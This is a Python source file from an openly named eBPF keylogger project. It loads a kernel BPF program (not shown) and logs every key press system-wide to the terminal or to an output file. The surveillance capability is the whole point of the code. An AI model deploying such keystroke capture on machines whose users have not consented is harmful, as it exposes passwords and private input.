#  bpf_keylogger: Log key presses and mouse button events systemwide using eBPF
#  Copyright (C) 2019  William Findlay
#
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <https://www.gnu.org/licenses/>.

import os, sys
import atexit
import signal
import time

from bcc import BPF

from defs import project_path, ticksleep
from keys import translate_keycode
from utils import drop_privileges

class BPFProgram():
    def __init__(self, args):
        self.bpf = None

        self.args = args

    @drop_privileges
    def open_file(self, *args, **kwargs):
        return open(*args, **kwargs)

    def register_exit_hooks(self):
        # Catch signals so we still invoke atexit
        signal.signal(signal.SIGTERM, lambda x, y: sys.exit(0))
        signal.signal(signal.SIGINT, lambda x, y: sys.exit(0))

        # Unregister self.cleanup if already registered
        atexit.unregister(self.cleanup)
        # Register self.cleanup
        atexit.register(self.cleanup)

    def cleanup(self):
        self.bpf = None

    def register_perf_buffers(self):
        def keypress(cpu, data, size):
            event = self.bpf["keypresses"].event(data)
            key = translate_keycode(event.code)
            if key:
                print(key)
                sys.stdout.flush()
        self.bpf["keypresses"].open_perf_buffer(keypress)

    def load_bpf(self):
        assert self.bpf == None

        # Set flags
        flags = []
        if self.args.debug:
            flags.append(f'-DBKL_DEBUG')

        with open(os.path.join(project_path, "src/bpf/bpf_program.c"), "r") as f:
            text = f.read()
            self.bpf = BPF(text=text, cflags=flags)
        self.register_exit_hooks()
        self.register_perf_buffers()

    def main(self):
        self.load_bpf()

        if self.args.outfile:
            sys.stdout = self.open_file(self.args.outfile, 'a+')

        print("Logging key presses... ctrl-c to quit", file=sys.stderr)

        while True:
            time.sleep(ticksleep)
            if self.args.debug:
                self.bpf.trace_print()
            self.bpf.perf_buffer_poll()
